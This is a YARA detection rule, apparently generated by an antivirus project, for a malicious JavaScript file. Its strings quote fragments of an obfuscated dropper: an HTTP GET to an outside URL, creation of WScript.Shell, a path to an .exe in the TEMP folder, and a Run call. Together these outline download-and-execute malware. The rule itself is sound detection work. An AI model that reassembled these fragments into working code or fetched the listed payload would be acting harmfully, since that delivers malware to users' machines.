rule sig_20160401_e028aa48f73dfb5e11037f13259cc805 {
  meta:
    description = "datamaliciousorder - file 20160401_e028aa48f73dfb5e11037f13259cc805.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "72e5909370c0aa47c413be92150c63778bdf539f39887b4589cdc094275e65b1"

  strings:
    $s1  = "MatXg[LdvFlq](\"G\" + \"ET\", \"http://ledivinecomedie.com/m9woq\", false);" fullword ascii
    $s2  = "function KlZa(VuHdo, ZgxXp){GqBu = GqBu * 1; return VuHdo - ZgxXp;};" fullword ascii
    $s3  = "var JkqHf = function HvjMm() {return WScript[SwOc](\"WScript\"+\".Shell\");}(), ZaMwb = 11;" fullword ascii
    $s4  = "if (MatXg[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YbSdv() {return JkqHf[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"YOHF2Tw1Yy73CMMY.ex\" + \"e\";};" fullword ascii
    $s6  = "function EhLzz(){return QrAr + \"\";};" fullword ascii
    $s7  = "function UpNn() {return ((LdpIit == true) && (LdpIit == MsjAic)) ? 1 : GqBu;};" fullword ascii
    $s8  = "function YoSbr()" fullword ascii
    $s9  = "function ZudHaa(SyjFcr){JkqHf[\"R\"+\"un\"](SyjFcr, GqBu, GqBu);};" fullword ascii
    $s10 = "function LjRrn(){return SwOc;};" fullword ascii
    $s11 = "return KlZa(IqoXgd, TeLnq);" fullword ascii
    $s12 = "var NbaBk = false;" fullword ascii
    $s13 = "function InAu(GfmLde) {var AbnEs = (1, 2, 3, 4, 5, GfmLde); return AbnEs;};" fullword ascii
    $s14 = "}while (TtTlj);" fullword ascii
    $s15 = "var MsjAic = false;" fullword ascii
    $s16 = "var LdpIit = false;" fullword ascii
    $s17 = "MsjAic = true; " fullword ascii
    $s18 = "LdpIit = true; " fullword ascii
    $s19 = "function OsrWet(){return 23;};" fullword ascii
    $s20 = "var NjLh = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}